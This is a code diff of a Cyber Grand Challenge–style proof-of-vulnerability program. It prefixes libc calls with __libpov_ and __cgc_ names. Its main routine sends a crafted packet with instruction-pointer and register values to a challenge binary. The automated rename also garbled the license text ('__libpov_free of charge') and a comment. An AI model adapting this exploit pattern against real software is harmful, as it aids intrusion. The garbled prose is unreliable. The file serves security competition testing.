@@ -1,7 +1,7 @@
 /*
  * Copyright (c) 2014 Kaprica Security, Inc.
  *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
+ * Permission is hereby granted, __libpov_free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
  * in the Software without restriction, including without limitation the rights
  * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
@@ -24,16 +24,16 @@
 #include <libpov.h>
 #include "xlat.h"
 
-#define transmit_str(_str) transmit_all(STDOUT, (_str), strlen((const char *)(_str)))
+#define transmit_str(_str) transmit_all(STDOUT, (_str), __libpov_strlen((const char *)(_str)))
 #define transmit_type2_byte(_pov) transmit_all(3, (_pov), sizeof(char))
 #define transmit_type2_short(_pov) transmit_all(3, (_pov), sizeof(short))
 #define transmit_type2_int(_pov) transmit_all(3, (_pov), sizeof(int))
 #define transmit_type2(_pov, _size) transmit_all(3, (_pov), (_size))
 
 // STOLEN FROM CROMU sample (not owned by Kaprica)
-// itoa - Does not check output buffer size.
-// Can potentially write up to 12 characters ("-2147483648\0") to str.
-void itoa(char *str, int i)
+// __cgc_itoa - Does not check output buffer size.
+// Can potentially __cgc_write up to 12 characters ("-2147483648\0") to str.
+void __cgc_itoa(char *str, int i)
 {
     char buffer[11];
     int pos = 0;
@@ -75,7 +75,7 @@ void read_until_line(char *line)
     while (!ready) {
         delimited_read(STDIN, &resp, &resp_len, (unsigned char *)"\n", 1);
         transmit_all(STDERR, resp, resp_len);
-        if (memcmp(resp, line, strlen(line)) == 0) {
+        if (__libpov_memcmp(resp, line, __libpov_strlen(line)) == 0) {
             ready = 1;
         }
     }
@@ -127,12 +127,12 @@ int main()
     xlat_seed("2e0715f1709c");
     transmit_all(STDOUT, "1234", 4); // dummy
     transmit_all(STDOUT, "1\n", 2);
-    strcpy(pkt, "-1198485360, ");
-    itoa(&pkt[strlen(pkt)], t1.ipval);
-    strcpy(&pkt[strlen(pkt)], ", -1148153712, ");
-    itoa(&pkt[strlen(pkt)], t1.regval);
-    strcpy(&pkt[strlen(pkt)], ", -1869553409, -1869574000, -1869574000, -1869574000,;;\n");
-    transmit_all(STDOUT, pkt, strlen(pkt));
+    __libpov_strcpy(pkt, "-1198485360, ");
+    __cgc_itoa(&pkt[__libpov_strlen(pkt)], t1.ipval);
+    __libpov_strcpy(&pkt[__libpov_strlen(pkt)], ", -1148153712, ");
+    __cgc_itoa(&pkt[__libpov_strlen(pkt)], t1.regval);
+    __libpov_strcpy(&pkt[__libpov_strlen(pkt)], ", -1869553409, -1869574000, -1869574000, -1869574000,;;\n");
+    transmit_all(STDOUT, pkt, __libpov_strlen(pkt));
     transmit_all(STDOUT, "2\n", 2);
     transmit_all(STDOUT, "131;\n", 5);
     transmit_all(STDOUT, "6\n", 2);
